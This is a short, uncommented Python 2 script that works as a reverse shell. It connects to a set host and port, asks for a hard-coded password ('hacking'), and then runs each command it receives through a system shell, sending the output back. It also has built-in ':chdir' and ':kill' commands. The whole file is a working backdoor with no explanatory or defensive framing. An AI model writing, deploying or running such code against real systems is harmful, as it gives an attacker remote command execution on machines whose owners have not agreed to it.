#! /usr/bin/python

import socket
import subprocess
import os

host = "localhost"
port = 12340
passwd = "hacking"


def login():
    global s
    s.send("Login: ")
    pwd = s.recv(1024)

    if pwd.strip() != passwd:
        login()
    else:
        s.send("Connected #> ")
        shell()

def shell():
    while True:
        data = s.recv(1024).strip()

        if data == ":kill":
              break

        try:
            cmd, params = data.split(" ", 1)
            if cmd == ":chdir":
                os.chdir(params)
                print "chdir to %s" % (params)
                s.send("#> ")
                continue
        except:
            pass

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
        s.send("#> ")



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
login()
